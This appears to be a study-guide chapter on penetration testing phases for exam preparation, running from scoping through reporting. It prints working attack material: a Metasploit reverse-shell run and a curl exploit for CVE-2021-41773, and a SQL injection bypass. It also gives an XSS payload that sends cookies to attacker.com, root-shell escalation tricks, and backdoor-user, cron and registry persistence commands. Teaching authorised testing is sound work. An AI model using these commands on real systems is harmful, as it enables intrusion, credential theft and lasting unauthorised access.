# 8. Penetration Testing Methodology - Complete Guide

## Overview
Based on 2022 Q3. Know the **standard phases** and what happens in each.

---

## 8.1 Pentest Phases

### Complete Methodology

**Exam Question:** "Describe the phases of a penetration test."

**Model Answer:**
"A penetration test follows structured phases: (1) Agreement - define scope, rules of engagement, and legal authorization; (2) Planning & Reconnaissance - gather information about target (passive OSINT, active scanning); (3) Scanning & Enumeration - identify live hosts, open ports, services, and vulnerabilities; (4) Exploitation - attempt to exploit discovered vulnerabilities to gain access; (5) Post-Exploitation & Persistence - escalate privileges, maintain access, pivot to other systems; (6) Reporting - document findings, impact, evidence, and remediation recommendations. Each phase builds on previous ones, and testers may iterate between phases. Proper authorization and documentation are critical throughout."

---

## 8.2 Phase 1: Agreement

### Purpose
Establish legal and technical boundaries before testing begins.

### Key Elements

**Scope Definition:**
```
IN SCOPE:
- IP ranges: 192.168.1.0/24, 10.0.0.0/8
- Domains: *.example.com
- Applications: web portal, API
- Time window: Mon-Fri 9am-5pm

OUT OF SCOPE:
- Production payment system
- Third-party services
- Physical security testing
- Social engineering (unless explicitly approved)
```

**Rules of Engagement (ROE):**
```
- Testing hours
- Denial of service restrictions
- Data handling requirements
- Communication protocols (emergency contacts)
- Reporting timeline
```

**Legal Documents:**
```
- Statement of Work (SOW)
- Non-Disclosure Agreement (NDA)
- Get-out-of-jail-free letter
- Permission from system owners
```

### Example 1: Scope Issues
```
Bad: "Test our network"
- Too vague
- No IP ranges
- No excluded systems

Good: "Test web servers 192.168.1.10-20 and API at api.example.com.
      Exclude database server 192.168.1.5.
      No DoS attacks. Testing Mon-Wed 10am-4pm EST."
- Specific targets
- Clear exclusions
- Defined constraints
```

---

## 8.3 Phase 2: Planning & Reconnaissance

### Passive Reconnaissance (OSINT)

**No direct interaction with target**

**Techniques:**
```
DNS Records:
- whois lookup ‚Üí owner info
- nslookup/dig ‚Üí IP addresses, mail servers
- DNS zone transfer (if misconfigured)

Search Engines:
- Google dorking: site:example.com filetype:pdf
- Cached pages
- Exposed documents

Social Media:
- Employee info (LinkedIn)
- Technology stack mentions
- Company structure

Public Databases:
- Shodan (exposed services)
- Certificate Transparency logs
- GitHub/GitLab (leaked credentials, internal info)
```

**Example 2: Google Dorking**
```
site:example.com filetype:pdf
‚Üí Find all PDFs (may contain metadata)

site:example.com inurl:admin
‚Üí Find admin panels

site:example.com ext:sql
‚Üí Find SQL files (possible database dumps)

"index of" site:example.com
‚Üí Find directory listings
```

### Active Reconnaissance

**Direct interaction with target**

**Techniques:**
```
Network Scanning:
- Ping sweep (find live hosts)
- Port scanning (find open services)
- OS fingerprinting
- Service version detection

Example:
$ nmap -sS -sV -O 192.168.1.0/24
- -sS: SYN stealth scan
- -sV: Version detection
- -O: OS detection
```

---

## 8.4 Phase 3: Scanning & Enumeration

### Port Scanning

**Example 3: Nmap Scan**
```bash
# Quick scan of common ports
$ nmap -F 192.168.1.10
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql

# Detailed scan with version detection
$ nmap -sV -p22,80,443,3306 192.168.1.10
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6
443/tcp  open  ssl/http Apache httpd 2.4.6
3306/tcp open  mysql   MySQL 5.5.60
```

### Service Enumeration

**HTTP/HTTPS:**
```bash
# Directory enumeration
$ gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt
/admin
/backup
/config.php
/uploads

# Technology detection
$ whatweb http://192.168.1.10
Apache, PHP 7.2.24, jQuery, Bootstrap
```

**SSH:**
```bash
$ nc 192.168.1.10 22
SSH-2.0-OpenSSH_7.4

# Try default credentials
$ hydra -L users.txt -P passwords.txt ssh://192.168.1.10
```

**SMB (Windows):**
```bash
$ enum4linux 192.168.1.20
- NetBIOS information
- Share enumeration
- User enumeration
- Password policy
```

### Vulnerability Scanning

**Example 4: Automated Scanning**
```bash
# Nmap NSE scripts
$ nmap --script vuln 192.168.1.10
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|   
| ssl-cert-expired:
|   VULNERABLE:
|   SSL certificate expired
```

---

## 8.5 Phase 4: Exploitation

### Exploitation Process

**1. Select vulnerability**
```
Identified: Apache 2.4.6 vulnerable to CVE-2021-41773
- Path traversal vulnerability
- Allows reading arbitrary files
```

**2. Find or develop exploit**
```bash
$ searchsploit Apache 2.4.6
Apache httpd 2.4.6 - Path Traversal

$ msfconsole
msf6> search Apache 2.4.6
msf6> use exploit/multi/http/apache_normalize_path_rce
```

**3. Execute exploit**
```bash
msf6> set RHOSTS 192.168.1.10
msf6> set LHOST 192.168.1.100
msf6> exploit

[*] Started reverse TCP handler
[*] Sending payload...
[*] Command shell session 1 opened
```

**4. Verify access**
```bash
whoami
‚Üí www-data

id
‚Üí uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Example 5: Web Application Exploitation

**SQL Injection:**
```sql
Username: admin' OR '1'='1' --
Password: anything

Query becomes:
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='...'
‚Üí Always true, authentication bypassed
```

**XSS:**
```javascript
// Stored XSS in comment field
<script>fetch('http://attacker.com/?c='+document.cookie)</script>

// When admin views comments ‚Üí cookie stolen
```

---

## 8.6 Phase 5: Post-Exploitation & Persistence

### Privilege Escalation

**Linux:**
```bash
# Check for SUID binaries
$ find / -perm -4000 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/find   ‚Üê Exploitable!

# Exploit find SUID
$ /usr/bin/find . -exec /bin/sh -p \; -quit
# ‚Üí root shell

# Check sudo permissions
$ sudo -l
User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/vim
    
# Exploit vim sudo
$ sudo vim -c ':!/bin/sh'
# ‚Üí root shell
```

**Windows:**
```powershell
# Check privileges
> whoami /priv

# Unquoted service path
> wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
C:\Program Files\My Service\service.exe

# If path not quoted and we can write to C:\Program Files\My:
# Create malicious My.exe ‚Üí restarts service ‚Üí code execution as SYSTEM
```

### Persistence

**Linux:**
```bash
# SSH keys
$ mkdir /root/.ssh
$ echo "attacker_public_key" >> /root/.ssh/authorized_keys
# Can now SSH as root

# Cron job
$ echo "*/5 * * * * /tmp/backdoor.sh" >> /etc/crontab
# Backdoor runs every 5 minutes

# Add user
$ useradd -m -s /bin/bash backdoor
$ echo "backdoor:password" | chpasswd
$ usermod -aG sudo backdoor
# Persistent user with sudo access
```

**Windows:**
```powershell
# Create admin user
> net user backdoor P@ssw0rd /add
> net localgroup administrators backdoor /add

# Registry Run key
> reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d C:\backdoor.exe

# Scheduled task
> schtasks /create /sc minute /mo 5 /tn "Backdoor" /tr C:\backdoor.exe
```

### Lateral Movement

**Pivot to other systems:**
```bash
# Scan internal network from compromised host
$ nmap -sn 10.0.0.0/24
10.0.0.1 (gateway)
10.0.0.50 (file server)
10.0.0.100 (database)

# Credential reuse
$ ssh admin@10.0.0.50
# Using found credentials from first host

# Port forwarding
$ ssh -L 3389:10.0.0.50:3389 compromised_host
# Access internal RDP through compromised host
```

---

## 8.7 Phase 6: Reporting

### Report Structure

**1. Executive Summary**
```
- High-level findings
- Business impact
- Risk ratings
- Remediation priorities

Example:
"The penetration test identified 3 critical vulnerabilities that allow
unauthenticated remote code execution. Immediate patching required to
prevent potential data breach affecting 10,000 customer records."
```

**2. Technical Findings**
```
For each vulnerability:

Title: SQL Injection in Login Form
Severity: Critical (CVSS 9.8)
Location: https://example.com/login.php
Description: The login form is vulnerable to SQL injection...
Impact: Complete database compromise, authentication bypass
Evidence: [screenshot of exploit]
Reproduction: [step-by-step instructions]
Remediation: Use prepared statements, input validation
References: OWASP Top 10 - A03:2021
```

**3. Methodology**
```
- Tools used
- Scope adhered to
- Timeline
- Limitations
```

**4. Recommendations**
```
Immediate (Critical):
- Patch Apache to 2.4.54
- Fix SQL injection vulnerabilities
- Disable unnecessary services

Short-term (High):
- Implement WAF
- Enable logging
- Security awareness training

Long-term (Medium):
- Regular security audits
- Bug bounty program
- SIEM implementation
```

### Example 6: Finding Documentation

**Vulnerability Entry:**
```
FINDING #1: Remote Code Execution via Apache Path Traversal
SEVERITY: Critical
CVSS: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

AFFECTED SYSTEM:
- 192.168.1.10 (web server)
- Apache 2.4.49

DESCRIPTION:
The Apache HTTP Server version 2.4.49 is vulnerable to CVE-2021-41773,
allowing path traversal and remote code execution via specially crafted
URI requests.

IMPACT:
An unauthenticated remote attacker can execute arbitrary commands on the
server with www-data privileges, potentially leading to complete system
compromise, data theft, and service disruption.

EVIDENCE:
$ curl 'http://192.168.1.10/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' \
  -d 'echo;id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)

REMEDIATION:
1. Immediately upgrade Apache to version 2.4.51 or later
2. If immediate patching not possible, disable CGI module
3. Implement WAF rules to block path traversal attempts
4. Monitor logs for exploitation attempts

REFERENCES:
- CVE-2021-41773
- https://httpd.apache.org/security/vulnerabilities_24.html
```

---

## üéØ Exam Tips for Pentest Methodology

### Phase Summary (Memorize)

```
1. Agreement
   - Scope, ROE, legal authorization
   - What/when/how to test

2. Planning & Reconnaissance
   - OSINT (passive)
   - Info gathering (active)
   
3. Scanning & Enumeration
   - Port scan (nmap)
   - Service enumeration
   - Vulnerability scanning

4. Exploitation
   - Use discovered vulns
   - Gain initial access
   
5. Post-Exploitation
   - Privilege escalation
   - Persistence
   - Lateral movement
   
6. Reporting
   - Document findings
   - Impact analysis
   - Remediation steps
```

### Common Tools (Know what each does)

```
Reconnaissance:
- nslookup, whois, dig (DNS)
- Google, Shodan (passive)

Scanning:
- nmap (port scanning)
- gobuster (directory enumeration)
- nikto (web vuln scanner)

Exploitation:
- Metasploit (exploit framework)
- SQLmap (SQL injection)
- Burp Suite (web app testing)

Post-Exploitation:
- Mimikatz (credential extraction)
- LinPEAS (privilege escalation)
- netcat (shells, pivoting)
```

---

## üìù Quick Reference

```
PENTEST PHASES (in order):
1. Agreement ‚Üí 2. Recon ‚Üí 3. Scanning ‚Üí 4. Exploitation ‚Üí 5. Post-Exploit ‚Üí 6. Report

KEY CONCEPTS:
Scope: What is/isn't allowed
ROE: Rules of engagement
OSINT: Passive info gathering
Enumeration: Detailed service info
Persistence: Maintain access
Lateral Movement: Pivot to other systems

REPORTING:
- Executive summary (business impact)
- Technical details (reproduction steps)
- Evidence (screenshots, logs)
- Remediation (prioritized recommendations)
```

---

[‚Üê Previous: Fuzzing](./07-fuzzing.md) | [Next: Security Best Practices ‚Üí](./09-security-practices.md)
